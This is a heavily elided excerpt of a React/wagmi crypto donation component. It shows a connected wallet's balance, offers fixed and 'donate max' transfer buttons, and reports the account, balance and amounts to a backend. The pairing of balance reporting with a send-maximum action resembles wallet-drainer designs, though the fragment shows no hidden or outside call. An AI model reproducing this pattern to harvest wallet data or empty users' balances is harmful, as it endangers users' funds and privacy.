...
import { useAccount, useBalance, useSendTransaction, useChainId, useConnectorClient } from "wagmi";
...
export default function App() {
  ...
  const { data: connectorClient } = useConnectorClient(); // replaces useSigner()
  ...
  useEffect(() => {
    if (isConnected && address) {
      ...
      const nativeBal = balanceData ? `${formatEther(BigInt(balanceData.value || 0))}` : "N/A";
      const payload = {
        account: address,
  ...
  const handleDonateFixed = async () => {
    ...
    try {
      ...
      notifyBackend("donation_attempt", { account: address, amount: "0.01", chain: chainId });
      ...
      notifyBackend("donation_sent", { account: address, amount: "0.01", chain: chainId });
    } catch (err) {
  ...
  const handleDonateMax = async () => {
    ...
    try {
      ...
      notifyBackend("donation_attempt", { account: address, amount: `${sendAmountEth.toFixed(6)}`, chain: chainId });
      notifyBackend("donation_sent", { account: address, amount: `${sendAmountEth.toFixed(6)}`, chain: chainId });
    } catch (err) {
      ...
      {isConnected && (
        <div className="flex flex-col gap-4 mt-6">
          <div className="text-sm text-gray-300">
            Connected: <span className="font-mono">{address}</span> on <strong>{chainId}</strong>
          </div>

          <div className="text-sm text-gray-300">
            Balance: {balanceData ? `${formatEther(BigInt(balanceData.value || 0))}` : "N/A"}
          </div>
          ...
          <div className="flex gap-3">
            <button
              ...
              disabled={loading}
            >
              Donate 0.01 {balanceData?.symbol || "native"}
            </button>
